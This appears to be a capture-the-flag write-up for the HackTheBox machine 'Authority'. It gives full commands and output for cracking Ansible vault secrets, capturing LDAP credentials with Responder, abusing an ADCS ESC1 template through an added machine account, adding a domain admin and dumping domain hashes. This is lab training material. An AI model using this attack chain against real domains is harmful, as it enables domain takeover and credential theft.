---
categories:
    - htb
layout: post
title: Authority Writeup - HackTheBox
tags:
    - writeup
    - hackthebox
    - medium
    - AD
---

Authority is a Windows Machine involving enumerating a share which exposes ansible secrets, hash cracking, capturing credentails and perforing adcs exploitation





## Nmap

```
sudo nmap -sC -sV --min-rate 1000 -T4 -vv -oN authority.nmap 10.129.229.56
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-07-30 20:46:47Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2025-07-30T20:47:36+00:00; +4h00m00s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d494:7710:6f6b:8100:e4e1:9cf2:aa40:dae1
| SHA-1: dded:b994:b80c:83a9:db0b:e7d3:5853:ff8e:54c6:2d0b
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d494:7710:6f6b:8100:e4e1:9cf2:aa40:dae1
| SHA-1: dded:b994:b80c:83a9:db0b:e7d3:5853:ff8e:54c6:2d0b
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d494:7710:6f6b:8100:e4e1:9cf2:aa40:dae1
| SHA-1: dded:b994:b80c:83a9:db0b:e7d3:5853:ff8e:54c6:2d0b
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d494:7710:6f6b:8100:e4e1:9cf2:aa40:dae1
| SHA-1: dded:b994:b80c:83a9:db0b:e7d3:5853:ff8e:54c6:2d0b
3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d494:7710:6f6b:8100:e4e1:9cf2:aa40:dae1
| SHA-1: dded:b994:b80c:83a9:db0b:e7d3:5853:ff8e:54c6:2d0b
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8443/tcp open  ssl/http      syn-ack ttl 127 Apache Tomcat (language: en)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_ssl-date: TLS randomness does not represent time
|_http-favicon: Unknown favicon MD5: F588322AAF157D82BB030AF1EFFD8CF9
| ssl-cert: Subject: commonName=172.16.2.118
| Issuer: commonName=172.16.2.118
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-07-28T20:41:24
| Not valid after:  2027-07-31T08:19:48
| MD5:   e12e:c0fc:f36e:e30f:32fa:f9bd:c960:d90b
| SHA-1: 1b01:1b47:25cf:e00f:7e7b:0023:fc82:9582:c3a1:c453
|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Lets generate the hosts and krb5.conf file using nxc
```
╭─xcr@pwnage ~/HTB/authority
╰─➤  nxc smb 10.129.229.56 --generate-hosts host
SMB         10.129.229.56   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
╭─xcr@pwnage ~/HTB/authority
╰─➤  nxc smb 10.129.229.56 --generate-krb5 krb5.conf
SMB         10.129.229.56   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
```

- The web server on port 80 is default IIS
- The smb has guest access allowed and guests can read the Development share

## User

```
nxc smb authority.authority.htb -u 'xcr' -p '' --shares
SMB         10.129.229.56   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.129.229.56   445    AUTHORITY        [+] authority.htb\xcr: (Guest)
SMB         10.129.229.56   445    AUTHORITY        [*] Enumerated shares
SMB         10.129.229.56   445    AUTHORITY        Share           Permissions     Remark
SMB         10.129.229.56   445    AUTHORITY        -----           -----------     ------
SMB         10.129.229.56   445    AUTHORITY        ADMIN$                          Remote Admin
SMB         10.129.229.56   445    AUTHORITY        C$                              Default share
SMB         10.129.229.56   445    AUTHORITY        Department Shares
SMB         10.129.229.56   445    AUTHORITY        Development     READ
SMB         10.129.229.56   445    AUTHORITY        IPC$            READ            Remote IPC
SMB         10.129.229.56   445    AUTHORITY        NETLOGON                        Logon server share
SMB         10.129.229.56   445    AUTHORITY        SYSVOL                          Logon server share
```

- Lets login in and check 
```
 impacket-smbclient authority.htb/xcr@authority.authority.htb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Password:
Type help for list of commands
# shares
ADMIN$
C$
Department Shares
Development
IPC$
NETLOGON
SYSVOL
# use Development
# ls
drw-rw-rw-          0  Fri Mar 17 14:37:34 2023 .
drw-rw-rw-          0  Fri Mar 17 14:37:34 2023 ..
drw-rw-rw-          0  Fri Mar 17 14:37:52 2023 Automation
# cd Automation
# ls
drw-rw-rw-          0  Fri Mar 17 14:37:52 2023 .
drw-rw-rw-          0  Fri Mar 17 14:37:52 2023 ..
drw-rw-rw-          0  Fri Mar 17 14:37:52 2023 Ansible
# cd Ansible
# ls
drw-rw-rw-          0  Fri Mar 17 14:37:52 2023 .
drw-rw-rw-          0  Fri Mar 17 14:37:52 2023 ..
drw-rw-rw-          0  Fri Mar 17 14:37:52 2023 ADCS
drw-rw-rw-          0  Fri Mar 17 14:37:52 2023 LDAP
drw-rw-rw-          0  Fri Mar 17 14:37:52 2023 PWM
drw-rw-rw-          0  Fri Mar 17 14:37:52 2023 SHARE
[--SNIP--]
/Automation/Ansible/LDAP/templates/sssd.conf.j2
/Automation/Ansible/LDAP/templates/sudo_group.j2
/Automation/Ansible/LDAP/vars/debian.yml
/Automation/Ansible/LDAP/vars/main.yml
/Automation/Ansible/LDAP/vars/redhat.yml
/Automation/Ansible/LDAP/vars/ubuntu-14.04.yml
/Automation/Ansible/PWM/defaults/main.yml
/Automation/Ansible/PWM/handlers/main.yml
/Automation/Ansible/PWM/meta/main.yml
/Automation/Ansible/PWM/tasks/main.yml
/Automation/Ansible/PWM/templates/context.xml.j2
/Automation/Ansible/PWM/templates/tomcat-users.xml.j2
/Automation/Ansible/SHARE/tasks/main.yml
/Automation/Ansible/ADCS/molecule/default/converge.yml
/Automation/Ansible/ADCS/molecule/default/molecule.yml
/Automation/Ansible/ADCS/molecule/default/prepare.yml
Finished - 79 files and folders
```
The directories contains a bunch of ansible files, Lets explore them, 
The PWM directory as there is a web service exposed as well, lets try to find some credentials

- the main.yml file in default contains encrypted credentials
```
cat main.yml
---
pwm_run_dir: "{{ lookup('env', 'PWD') }}"

pwm_hostname: authority.htb.corp
pwm_http_port: "{{ http_port }}"
pwm_https_port: "{{ https_port }}"
pwm_https_enable: true

pwm_require_ssl: false

pwm_admin_login: !vault |
          $ANSIBLE_VAULT;1.1;AES256  32666534386435366537653136663731633138616264323230383566333966346662313161326239    6134353663663462373265633832356663356239383039640a346431373431666433343434366139     35653634376333666234613466396534343030656165396464323564373334616262613439343033     6334326263326364380a653034313733326639323433626130343834663538326439636232306531
          3438

pwm_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256  31356338343963323063373435363261323563393235633365356134616261666433393263373736     3335616263326464633832376261306131303337653964350a363663623132353136346631396662386564323238303933393362313736373035356136366465616536373866346138623166383535303930356637306461350a316466663037303037653761323565343338653934646533663365363035
          6531

ldap_uri: ldap://127.0.0.1/
ldap_base_dn: "DC=authority,DC=htb"
ldap_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          63303831303534303266356462373731393561313363313038376166336536666232626461653630
          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
          34646237336164356438383034623462323531316333623135383134656263663266653938333334
          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
          3764
```


```
ansible2john
pwm_admin_login:$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8
pwm_admin_password:$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5
ldap_admin_password:$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635
```

```
 ./john --wordlist=../../SecLists/Passwords/Leaked-Databases/rockyou.txt hash               chandan@Mac
Warning: detected hash type "ansible", but the string is also recognized as "ansible-opencl"
Use the "--format=ansible-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (ansible, Ansible Vault [PBKDF2-SHA256 HMAC-256 128/128 ASIMD 4x])
Cost 1 (iteration count) is 10000 for all loaded hashes
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
!@#$%^&*         (pwm_admin_password)
!@#$%^&*         (pwm_admin_login)
!@#$%^&*         (ldap_admin_password)
```

saved the cracked pass as .vault-password and decrypted enc blobs

```
ansible-vault decrypt pwm_admin_login --vault-password-file .vault-password

ansible-vault decrypt pwm_admin_login --vault-password-file .vault-password

ansible-vault decrypt pwm_admin_password --vault-password-file .vault-password

```

You will get `Decryption successful` if its correct password

login to PWN which is in configuration mode, we can configure our ip as an additional ldap server and have it auth capturing creds in responder

```
sudo responder -I tun0
[+] Listening for events...

[LDAP] Cleartext Client   : 10.129.229.56
[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
[LDAP] Cleartext Password : lDaP_1n_th3_cle4r!
[*] Skipping previously captured cleartext password for CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
```

we can winrm with the svc_ldap account
```
nxc winrm authority.authority.htb -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!'
WINRM       10.129.229.56   5985   AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb)
WINRM       10.129.229.56   5985   AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! (Pwn3d!)
```

Get the user flag
```
evil-winrm-py -i authority.authority.htb -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
          _ _            _
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.2.0

[*] Connecting to authority.authority.htb:5985 as svc_ldap
evil-winrm-py PS C:\Users\svc_ldap\Desktop> ls


    Directory: C:\Users\svc_ldap\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        7/30/2025   4:42 PM             34 user.txt
```

## Root
The machine had only one svc_ldap user profile and administrator and no special privs as well, Let check for adcs
lets check certipy if there are vulnerable certs
```
Certificate Templates
  0
    Template Name                       : CorpVPN
    Display Name                        : Corp VPN
    Certificate Authorities             : AUTHORITY-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollmentCheckUserDsCertificate
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
                                          Document Signing
                                          IP security IKE intermediate
                                          IP security use
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 20 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2023-03-24T23:48:09+00:00
    Template Last Modified              : 2023-03-24T23:48:11+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : AUTHORITY.HTB\Domain Computers
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : AUTHORITY.HTB\Administrator
        Full Control Principals         : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Write Owner Principals          : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Write Dacl Principals           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Write Property Enroll           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
    [+] User Enrollable Principals      : AUTHORITY.HTB\Domain Computers
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```

We can see that svc_ldap can request CorpVPN which is vulnerable to ESC1. Lets exploit to get administrator
Lets also get the domain and admin SID's
```
impacket-lookupsid authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!'@authority.authority.htb                                                                                             130 ↵
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Brute forcing SIDs at authority.authority.htb
[*] StringBinding ncacn_np:authority.authority.htb[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-622327497-3269355298-2248959698
498: HTB\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: HTB\Administrator (SidTypeUser)
501: HTB\Guest (SidTypeUser)
502: HTB\krbtgt (SidTypeUser)
512: HTB\Domain Admins (SidTypeGroup)
513: HTB\Domain Users (SidTypeGroup)
514: HTB\Domain Guests (SidTypeGroup)
515: HTB\Domain Computers (SidTypeGroup)
516: HTB\Domain Controllers (SidTypeGroup)
517: HTB\Cert Publishers (SidTypeAlias)
518: HTB\Schema Admins (SidTypeGroup)
519: HTB\Enterprise Admins (SidTypeGroup)
520: HTB\Group Policy Creator Owners (SidTypeGroup)
521: HTB\Read-only Domain Controllers (SidTypeGroup)
522: HTB\Cloneable Domain Controllers (SidTypeGroup)
525: HTB\Protected Users (SidTypeGroup)
526: HTB\Key Admins (SidTypeGroup)
527: HTB\Enterprise Key Admins (SidTypeGroup)
553: HTB\RAS and IAS Servers (SidTypeAlias)
571: HTB\Allowed RODC Password Replication Group (SidTypeAlias)
572: HTB\Denied RODC Password Replication Group (SidTypeAlias)
1000: HTB\AUTHORITY$ (SidTypeUser)
1101: HTB\DnsAdmins (SidTypeAlias)
1102: HTB\DnsUpdateProxy (SidTypeGroup)
1601: HTB\svc_ldap (SidTypeUser)
```

But we are unable to request cert as this is only for Domain Computers
```
certipy -debug req -u 'svc_ldap@authority.htb' -p 'lDaP_1n_th3_cle4r!' -ca AUTHORITY-CA -template CorpVPN -dc-ip 10.129.229.56 -target authority.authority.htb -upn 'administrator@authority.htb' -sid 'S-1-5-21-622327497-3269355298-2248959698-500' -dc-host authority.authority.htb -ns 10.129.229.56
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[+] Nameserver: '10.129.229.56'
[+] DC IP: '10.129.229.56'
[+] DC Host: 'authority.authority.htb'
[+] Target IP: None
[+] Remote Name: 'authority.authority.htb'
[+] Domain: 'AUTHORITY.HTB'
[+] Username: 'SVC_LDAP'
[+] Trying to resolve 'authority.authority.htb' at '10.129.229.56'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.129.229.56[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.129.229.56[\pipe\cert]
[*] Request ID is 2
[-] Got error while requesting certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
Would you like to save the private key? (y/N): n
```

Every user is able to add computer to the domain, Lets check if there is quota available
```
nxc ldap authority.authority.htb -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -M maq                                                                                                      130 ↵
LDAP        10.129.229.56   389    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb)
LDAPS       10.129.229.56   636    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r!
MAQ         10.129.229.56   389    AUTHORITY        [*] Getting the MachineAccountQuota
MAQ         10.129.229.56   389    AUTHORITY        MachineAccountQuota: 10
```

- Add a computer
```
impacket-addcomputer authority.htb/svc_ldap -computer-pass 'newPass123!' -dc-ip 10.129.229.56 -method LDAPS
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Password:
[*] Successfully added machine account DESKTOP-P3N8EWHF$ with password newPass123!.
```

- lets request cert now

```
certipy -debug req -u 'DESKTOP-P3N8EWHF$@authority.htb' -p 'newPass123!' -ca AUTHORITY-CA -template CorpVPN -dc-ip 10.129.229.56 -target authority.authority.htb -upn 'administrator@authority.htb' -sid 'S-1-5-21-622327497-3269355298-2248959698-500' -dc-host authority.authority.htb -ns 10.129.229.56
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[+] Nameserver: '10.129.229.56'
[+] DC IP: '10.129.229.56'
[+] DC Host: 'authority.authority.htb'
[+] Target IP: None
[+] Remote Name: 'authority.authority.htb'
[+] Domain: 'AUTHORITY.HTB'
[+] Username: 'DESKTOP-P3N8EWHF$'
[+] Trying to resolve 'authority.authority.htb' at '10.129.229.56'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.129.229.56[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.129.229.56[\pipe\cert]
[*] Request ID is 3
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@authority.htb'
[+] Found SID in SAN URL: 'S-1-5-21-622327497-3269355298-2248959698-500'
[+] Found SID in security extension: 'S-1-5-21-622327497-3269355298-2248959698-500'
[*] Certificate object SID is 'S-1-5-21-622327497-3269355298-2248959698-500'
[*] Saving certificate and private key to 'administrator.pfx'
[+] Attempting to write data to 'administrator.pfx'
[+] Data written to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```


```
certipy auth -pfx administrator.pfx -domain authority.htb -username administrator -dc-ip 10.129.229.56
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@authority.htb'
[*]     SAN URL SID: 'S-1-5-21-622327497-3269355298-2248959698-500'
[*]     Security Extension SID: 'S-1-5-21-622327497-3269355298-2248959698-500'
[*] Using principal: 'administrator@authority.htb'
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
[-] Use -debug to print a stacktrace
[-] See the wiki for more information
```
- Trying to unpac the hash fails due to missing certificate so we can use ldap-shell



```
certipy auth -pfx administrator.pfx -domain authority.htb -username administrator -dc-ip 10.129.229.56 -ldap-shell                                                                   1 ↵
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@authority.htb'
[*]     SAN URL SID: 'S-1-5-21-622327497-3269355298-2248959698-500'
[*]     Security Extension SID: 'S-1-5-21-622327497-3269355298-2248959698-500'
[*] Connecting to 'ldaps://10.129.229.56:636'
[*] Authenticated to '10.129.229.56' as: 'u:HTB\\Administrator'
Type help for list of commands

# help

 add_computer computer [password] [nospns] - Adds a new computer to the domain with the specified password. If nospns is specified, computer will be created with only a single necessary HOST
 SPN. Requires LDAPS.
 rename_computer current_name new_name - Sets the SAMAccountName attribute on a computer object to a new value.
 add_user new_user [parent] - Creates a new user.
 add_user_to_group user group - Adds a user to a group.
 change_password user [password] - Attempt to change a given user's password. Requires LDAPS.
 clear_rbcd target - Clear the resource based constrained delegation configuration information.
 disable_account user - Disable the user's account.
 enable_account user - Enable the user's account.
 dump - Dumps the domain.
 search query [attributes,] - Search users and groups by name, distinguishedName and sAMAccountName.
 get_user_groups user - Retrieves all groups this user is a member of.
 get_group_users group - Retrieves all members of a group.
 get_laps_password computer - Retrieves the LAPS passwords associated with a given computer (sAMAccountName).
 grant_control target grantee - Grant full control of a given target object (sAMAccountName) to the grantee (sAMAccountName).
 set_dontreqpreauth user true/false - Set the don't require pre-authentication flag to true or false.
 set_rbcd target grantee - Grant the grantee (sAMAccountName) the ability to perform RBCD to the target (sAMAccountName).
 start_tls - Send a StartTLS command to upgrade from LDAP to LDAPS. Use this to bypass channel binding for operations necessitating an encrypted channel.
 write_gpo_dacl user gpoSID - Write a full control ACE to the gpo for the given user. The gpoSID must be entered surrounding by {}.
 whoami - get connected user
 dirsync - Dirsync requested attributes
 exit - Terminates this session.

```

- I will create a new user and add to domain admins
```
# whoami
u:HTB\Administrator
# add_user xcr
Attempting to create user in: %s CN=Users,DC=authority,DC=htb
Adding new user with username: xcr and password: Elo+Y?Q[Fm&79\) result: OK
# add_user_to_group xcr "CN=Domain Admins,CN=Users,DC=authority,DC=htb"
Adding user: xcr to group Domain Admins result: OK
```

- Now secretsdump
```
impacket-secretsdump authority.htb/xcr@authority.htb -dc-ip 10.129.229.56
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Password:
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x31f4629800790a973f9995cec47514c6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a15217bb5af3046c87b5bb6afa7b193e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
HTB\AUTHORITY$:aes256-cts-hmac-sha1-96:7dd5cd43996073628da0b1b68fb51ff0ac8a0e8a1925d6c846a5ab69a20a276c
HTB\AUTHORITY$:aes128-cts-hmac-sha1-96:6e1218d65dba76980df984e72b09cede
HTB\AUTHORITY$:des-cbc-md5:ceb3c126ce68ec29
HTB\AUTHORITY$:plain_password_hex:38a532679719d4903a109428f1fefcbfb3d878eada70acd3f9556398953f4e5024989cb6857b0eb87788fc80c1244b4bf8405b40869aebe4f40259065c217c0833bb89af223764ee5d6cd5945704
99f30adb05214363674c94791392b39ce72c011939b94932c97df4dd7db7f5a808d4a7c9627913e85db3b4c9e4b6e2c5e6de4aab619abe7359bd7e07404b3104efb1ee0ff997609b666096ca1e722bb7943781c2ac2f3bf66062c1f9b785ca
93ed3f124b971cb5640b20973225315e15a9f06a0b51dab09f57502bc6264d2ad4a4ea7b70bc9370023bf0deb4751b1236ec9193b0763bcaa9e3f79ddf0bb6dc2b7e53
HTB\AUTHORITY$:aad3b435b51404eeaad3b435b51404ee:077009353746dea853c7da91f34da1d0:::
[*] DPAPI_SYSTEM
dpapi_machinekey:0xd5d60027f85b1132cef2cce88a52670918252114
dpapi_userkey:0x047c1e3ad8db9d688c3f1e9ea06c8f2caf002511
[*] NL$KM
 0000   F9 41 4F E3 80 49 A5 BD  90 2D 68 32 F7 E3 8E E7   .AO..I...-h2....
 0010   7F 2D 9B 4B CE 29 B0 E6  E0 2C 59 5A AA B7 6F FF   .-.K.)...,YZ..o.
 0020   5A 4B D6 6B DB 2A FA 1E  84 09 35 35 9F 9B 2D 11   ZK.k.*....55..-.
 0030   69 4C DE 79 44 BA E1 4B  5B BC E2 77 F4 61 AE BA   iL.yD..K[..w.a..
NL$KM:f9414fe38049a5bd902d6832f7e38ee77f2d9b4bce29b0e6e02c595aaab76fff5a4bd66bdb2afa1e840935359f9b2d11694cde7944bae14b5bbce277f461aeba
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:bd6bd7fcab60ba569e3ed57c7c322908:::
svc_ldap:1601:aad3b435b51404eeaad3b435b51404ee:6839f4ed6c7e142fed7988a6c5d0c5f1:::
xcr:12102:aad3b435b51404eeaad3b435b51404ee:0e5bf431e73b3d9eb8b7aa39f1e76500:::
AUTHORITY$:1000:aad3b435b51404eeaad3b435b51404ee:077009353746dea853c7da91f34da1d0:::
[*] Kerberos keys grabbed
[--SNIP--]
```